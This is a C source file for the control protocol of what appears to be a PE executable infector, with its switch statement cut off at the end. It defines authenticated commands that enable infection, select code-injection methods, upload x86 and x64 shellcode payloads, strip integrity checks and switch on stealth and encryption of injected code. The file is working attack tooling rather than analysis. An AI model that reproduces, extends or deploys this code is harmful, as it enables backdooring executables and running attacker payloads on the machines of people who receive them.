/*
 * \file   libpeprotocol.c
 * \author A.G.
 * \brief
 */

#include "libpeprotocol.h"
#include "3rdparty/ini/minIni.h"
#ifdef _WIN32 /* Windows/Linux Switch */
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#endif
#include <stdarg.h>
#include <time.h>

/* Commands */
typedef enum _PEPROTOCOL_CMD {
  /* Command - CMDs */
  CMD_SEND_ECHO = 0x01,
  CMD_SEND_RESTART = 0x02,
  CMD_SEND_SET_SECTION_NAME = 0x03,
  CMD_SEND_SET_METHOD_CHANGE_FLAGS = 0x04,
  CMD_SEND_SET_METHOD_NEW_SECTION = 0x05,
  CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE = 0x06,
  CMD_SEND_SET_METHOD_ALIGNMENT = 0x07,
  CMD_SEND_SET_REMOVE_INTEGRITY_CHECK = 0x08,
  CMD_SEND_SET_DATA_PORT = 0x09,
  CMD_SEND_SET_DATA_INTERFACE = 0x0A,
  CMD_SEND_SET_CONTROL_PORT = 0x0B,
  CMD_SEND_SET_CONTROL_INTERFACE = 0x0C,
  CMD_SEND_SET_PAYLOAD_X86 = 0x0D,
  CMD_SEND_SET_PAYLOAD_X64 = 0x0E,
  CMD_SEND_GET_CONFIG = 0x0F,
  CMD_SEND_SET_PAYLOAD_NAME_X86 = 0x10,
  CMD_SEND_SET_TRY_STAY_STEALTH = 0x11,
  CMD_SEND_SET_ENABLE = 0x12,
  CMD_SEND_SET_RANDOM_SECTION_NAME = 0x13,
  CMD_SEND_SHUTDOWN = 0x14,
  CMD_SEND_SET_PAYLOAD_NAME_X64 = 0x15,
  CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP = 0x16,
  CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS = 0x17,
  CMD_SEND_SET_ENCRYPT = 0x18,
  CMD_SEND_SET_ENCRYPT_ITERATIONS = 0x19,
  CMD_SEND_SET_TOKEN = 0x20,

  /* Response CMDs*/
  CMD_RECEIVE_SUCCESS = 0xFD,
  CMD_RECEIVE_ERROR = 0xFE,
} PEPROTOCOL_CMD;

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* PEPROTOCOL structure */
#pragma pack(1)
typedef struct _PEPROTOCOL {
  uint8_t token[32]; // access token
  uint8_t command;   // Command byte
  uint32_t size;     // Size of data
  char data[0];      // data
} PEPROTOCOL;
#pragma pack()

/* synchronized debugging */
static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...) {
# ifdef PESERVER_DEBUG_OUTPUT
  va_list args;
  va_start(args, msg);
  time_t timer;
  char buffer[29];
  struct tm* tm_info;
  time(&timer);

  /* Get time */
  tm_info = localtime(&timer);
  strftime(buffer, 29, "[%Y:%m:%d %H:%M:%S] ", tm_info);

  if (pthread_mutex_lock(&server->debug_mutex)) {
    return; /* Error locking mutex */
  }
  /* print timestamp */
  printf("%s", buffer);
  if (sock != 0) {
    printf("[SOCK:%d] ", sock);
  }
  /* Print message */
  vprintf(msg, args);
  fflush(stdout);
  pthread_mutex_unlock(&server->debug_mutex);
# endif
}

/* Checks characters in string. Filter: white-list: 0-9a-zA-Z ()-_,. */
static inline bool __peprotocol_check_string(char *mem, uint32_t memsize) {
  do {
    if (!(((*mem >= '0') && (*mem <= '9')) || ((*mem >= 'a') && (*mem <= 'z')) || ((*mem >= 'A') && (*mem <= 'z'))
        || (*mem == '(') || (*mem == ')') || (*mem == '-') || (*mem == '_') || (*mem == ',') || (*mem == '.')
        || (*mem == ' '))) {
      return false;
    }
    ++mem;
  } while (--memsize);

  return true;
}

/* Send success response */
static void inline __peprotocol_process_receive_success(PEPROTOCOL *protocol, int sock) {
  protocol->command = CMD_RECEIVE_SUCCESS;
  protocol->size = 0;
  send(sock, (const void*) protocol, sizeof(PEPROTOCOL), 0);
}

/* Send error response */
static void inline __peprotocol_process_receive_error(PEPROTOCOL *protocol, int sock) {
  protocol->command = CMD_RECEIVE_ERROR;
  protocol->size = 0;
  send(sock, (const void*) protocol, sizeof(PEPROTOCOL), 0);
}

/* Set command to success and echo message */
static void inline __peprotocol_process_echo(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  /* only change the command, send the same data back */
  protocol->command = CMD_RECEIVE_SUCCESS;
  send(sock, (const void*) protocol, (sizeof(PEPROTOCOL) + protocol->size), 0);
}

/* Restart server */
static void inline __peprotocol_process_restart(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }
  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
  /* Restart */
  peserver_terminate(true, server);
}

/* Set section name for new infections */
static void inline __peprotocol_process_set_section_name(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_sectionname(protocol->data, protocol->size, false, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "section_name", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Change Flag Method */
static void inline __peprotocol_process_set_method_change_flags(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_CHANGE_FLAGS) :
          (peinfect_get_methods(server->infect) & ~METHOD_CHANGE_FLAGS), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_change_flags", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable New Section Method */
static void inline __peprotocol_process_set_method_new_section(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_NEW_SECTION) :
          (peinfect_get_methods(server->infect) & ~METHOD_NEW_SECTION), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_new_section", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Alignment Resize Method */
static void inline __peprotocol_process_set_method_alignment_resize(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_ALIGNMENT_RESIZE) :
          (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT_RESIZE), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_alignment_resize", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Alignment Method */
static void inline __peprotocol_process_set_method_alignment(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_ALIGNMENT) :
          (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_alignment", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Cross Section Jump Method */
static void inline __peprotocol_process_set_method_cross_section_jump(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_CROSS_SECTION_JUMP) :
          (peinfect_get_methods(server->infect) & ~METHOD_CROSS_SECTION_JUMP), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_cross_section_jump", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set cross section jump iterations */
static void inline __peprotocol_process_set_method_cross_section_jump_iterations(PEPROTOCOL *protocol, PESERVER *server,
    int sock) {
  int *iterations = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  iterations = (int *) protocol->data;
  peinfect_set_jumpiterations(*iterations, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_cross_section_jump_iterations", *iterations, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable encryption */
static void inline __peprotocol_process_set_encrypt(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_encrypt(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "encrypt", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set encrypt iterations */
static void inline __peprotocol_process_set_encrypt_iterations(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *iterations = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  iterations = (int *) protocol->data;
  peinfect_set_encryptiterations(*iterations, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "encrypt_iterations", *iterations, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Remove Integrity Check */
static void inline __peprotocol_process_set_remove_integrity_check(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_removeintegrity(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("integrity", "remove_integrity_check", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening data port */
static void inline __peprotocol_process_set_data_port(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *port = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Ports are persistent */
  if (server->persistent_ports) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  port = (int *) protocol->data;

  if (!ini_putl("server", "data_port", *port, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening data interface */
static void inline __peprotocol_process_set_data_interface(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "data_interface", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening control port */
static void inline __peprotocol_process_set_control_port(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *port = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Ports are persistent */
  if (server->persistent_ports) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  port = (int *) protocol->data;

  if (!ini_putl("server", "control_port", *port, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening control interface */
static void inline __peprotocol_process_set_control_interface(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "control_interface", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set x86 payload */
static void inline __peprotocol_process_set_payload_x86(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, false, server->infect);

  /* lock the .bin-file */
  if (pthread_mutex_lock(&server->config->shellcode_x86_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *sc = fopen(server->config->shellcode_x86_name, "w+b");

  if (sc != NULL) {
    /* write .bin-file */
    fwrite(protocol->data, 1, protocol->size, sc);
    fclose(sc);

    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  } else {

    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* unlock the .bin-file */
  pthread_mutex_unlock(&server->config->shellcode_x86_mutex);
}

/* Set x64 payload */
static void inline __peprotocol_process_set_payload_x64(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, true, server->infect);

  /* lock the .bin-file */
  if (pthread_mutex_lock(&server->config->shellcode_x64_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *sc = fopen(server->config->shellcode_x64_name, "w+b");

  if (sc != NULL) {
    /* write .bin-file */
    fwrite(protocol->data, 1, protocol->size, sc);
    fclose(sc);

    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  } else {

    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* unlock the .bin-file */
  pthread_mutex_unlock(&server->config->shellcode_x64_mutex);
}

/* read ini-file as binary and send it to the control server */
static void inline __peprotocol_process_get_config(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  unsigned char *file_mem;

  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Force write config */
  peserver_write_config(server);

  /* lock the config.ini */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *conf = fopen(server->config->config_name, "rb");

  if (conf != NULL) {
    /* Get file size and allocate buffer */
    fseek(conf, 0L, SEEK_END);
    size_t size = ftell(conf);
    size_t read_size = 0;
    rewind(conf);
    file_mem = malloc(size + sizeof(PEPROTOCOL));

    if (file_mem != NULL) {
      /* Load file into buffer */
      read_size = fread(file_mem + sizeof(PEPROTOCOL), size, 1, conf);
      fclose(conf);
      conf = NULL;

      /* Send the buffered config-file to the pe-control */
      if (read_size == 1) {
        memcpy(file_mem, protocol->token, PESERVER_TOKEN_SIZE);
        protocol = (PEPROTOCOL *) file_mem;
        protocol->command = CMD_RECEIVE_SUCCESS;
        protocol->size = size;
        send(sock, (const void*) protocol, (sizeof(PEPROTOCOL) + protocol->size), 0);
      }

      /* free buffer after use */
      free(file_mem);
    }

    /* Close file (if memory allocation has failed) */
    if (conf != NULL) {
      fclose(conf);
    }
  }
  /* unlock the config.ini */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set x86 payload name */
static void inline __peprotocol_process_set_payload_name_x86(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "payload_name_x86", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable try stealth */
static void inline __peprotocol_process_set_try_stay_stealth(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_trystaystealth(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("integrity", "try_stay_stealth", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Globally Enable/Disable Infection */
static void inline __peprotocol_process_set_enable(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peserver_enable_infection(option, server);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "enable", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable random section names */
static void inline __peprotocol_process_set_random_section_name(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_sectionname(NULL, 0, true, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("name", "section_name_random", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Shutdown server */
static void inline __peprotocol_process_shutdown(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }
  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
  /* Shutdown */
  peserver_terminate(false, server);
}

/* Set token */
static void inline __peprotocol_process_set_token(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != PESERVER_TOKEN_SIZE) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Set token */
  if (!peserver_set_token((unsigned char *) protocol->data, PESERVER_TOKEN_SIZE, server)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Force config write on token change */
  peserver_write_config(server);

  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
}

/* Set x64 payload name */
static void inline __peprotocol_process_set_payload_name_x64(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "payload_name_x64", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Process PEPROTOCOL */
bool peprotocol_process_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {
  PEPROTOCOL *protocol = (PEPROTOCOL *) datamem;
  bool token_ok = true;
  size_t i = 0;

  /* Don't send any answer */
  if (datamemsize < 5) {
    return false;
  }

  /* Check authentication token size */
  if (datamemsize < PESERVER_TOKEN_SIZE) {
    __peserver_debug(server, sock, "[CRTL] Invalid token size\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Compare token */
  /* DON'T USE memcpy() AND DON'T break THE LOOP! (Timing attacks!) */
  for (i = 0; i < PESERVER_TOKEN_SIZE; ++i) {
    if (datamem[i] != server->token[i]) {
      token_ok = false;
    }
  }

  /* Check token */
  if (!token_ok) {
    __peserver_debug(server, sock, "[CRTL] Invalid token\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Check size of command */
  if (datamemsize != (sizeof(uint8_t) + sizeof(uint32_t) + PESERVER_TOKEN_SIZE + protocol->size)) {
    /* return an error message */
    __peserver_debug(server, sock, "[CRTL] Invalid command size\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Switch commands */
  switch (protocol->command) {
    case CMD_SEND_ECHO:
      __peserver_debug(server, sock, "[CRTL] Process echo\n");
      __peprotocol_process_echo(protocol, server, sock);
      break;

    case CMD_SEND_RESTART:
      __peserver_debug(server, sock, "[CRTL] Process restart\n");
      __peprotocol_process_restart(protocol, server, sock);
      break;

    case CMD_SEND_SET_SECTION_NAME:
      __peserver_debug(server, sock, "[CRTL] Process set section name\n");
      __peprotocol_process_set_section_name(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CHANGE_FLAGS:
      __peserver_debug(server, sock, "[CRTL] Process set method change flags\n");
      __peprotocol_process_set_method_change_flags(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_NEW_SECTION:
      __peserver_debug(server, sock, "[CRTL] Process set method new section\n");
      __peprotocol_process_set_method_new_section(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE:
      __peserver_debug(server, sock, "[CRTL] Process set method alignment resize\n");
      __peprotocol_process_set_method_alignment_resize(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_ALIGNMENT:
      __peserver_debug(server, sock, "[CRTL] Process set method alignment\n");
      __peprotocol_process_set_method_alignment(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP:
      __peserver_debug(server, sock, "[CRTL] Process set method cross section jump\n");
      __peprotocol_process_set_method_cross_section_jump(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS:
      __peserver_debug(server, sock, "[CRTL] Process set cross section jump iterations \n");
      __peprotocol_process_set_method_cross_section_jump_iterations(protocol, server, sock);
      break;

    case CMD_SEND_SET_REMOVE_INTEGRITY_CHECK:
      __peserver_debug(server, sock, "[CRTL] Process set remove integrity check\n");
      __peprotocol_process_set_remove_integrity_check(protocol, server, sock);
      break;

    case CMD_SEND_SET_DATA_PORT:
      __peserver_debug(server, sock, "[CRTL] Process set data port\n");
      __peprotocol_process_set_data_port(protocol, server, sock);
      break;

    case CMD_SEND_SET_DATA_INTERFACE:
      __peserver_debug(server, sock, "[CRTL] Process set data interface\n");
      __peprotocol_process_set_data_interface(protocol, server, sock);
      break;

    case CMD_SEND_SET_CONTROL_PORT:
      __peserver_debug(server, sock, "[CRTL] Process set control port\n");
      __peprotocol_process_set_control_port(protocol, server, sock);
      break;

    case CMD_SEND_SET_CONTROL_INTERFACE:
      __peserver_debug(server, sock, "[CRTL] Process set control interface\n");
      __peprotocol_process_set_control_interface(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_X86:
      __peserver_debug(server, sock, "[CRTL] Process set payload x86\n");
      __peprotocol_process_set_payload_x86(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_X64:
      __peserver_debug(server, sock, "[CRTL] Process set payload x64\n");
      __peprotocol_process_set_payload_x64(protocol, server, sock);
      break;

    case CMD_SEND_GET_CONFIG:
      __peserver_debug(server, sock, "[CRTL] Process get config\n");
      __peprotocol_process_get_config(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_NAME_X86:
      __peserver_debug(server, sock, "[CRTL] Process set payload name x86\n");
      __peprotocol_process_set_payload_name_x86(protocol, server, sock);
      break;

    case CMD_SEND_SET_TRY_STAY_STEALTH:
      __peserver_debug(server, sock, "[CRTL] Process set try stealth\n");
      __peprotocol_process_set_try_stay_stealth(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENABLE:
      __peserver_debug(server, sock, "[CRTL] Process set enable\n");
      __peprotocol_process_set_enable(protocol, server, sock);
      break;

    case CMD_SEND_SET_RANDOM_SECTION_NAME:
      __peserver_debug(server, sock, "[CRTL] Process set random section name\n");
      __peprotocol_process_set_random_section_name(protocol, server, sock);
      break;

    case CMD_SEND_SHUTDOWN:
      __peserver_debug(server, sock, "[CRTL] Process shutdown\n");
      __peprotocol_process_shutdown(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_NAME_X64:
      __peserver_debug(server, sock, "[CRTL] Process set payload name x64\n");
      __peprotocol_process_set_payload_name_x64(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENCRYPT:
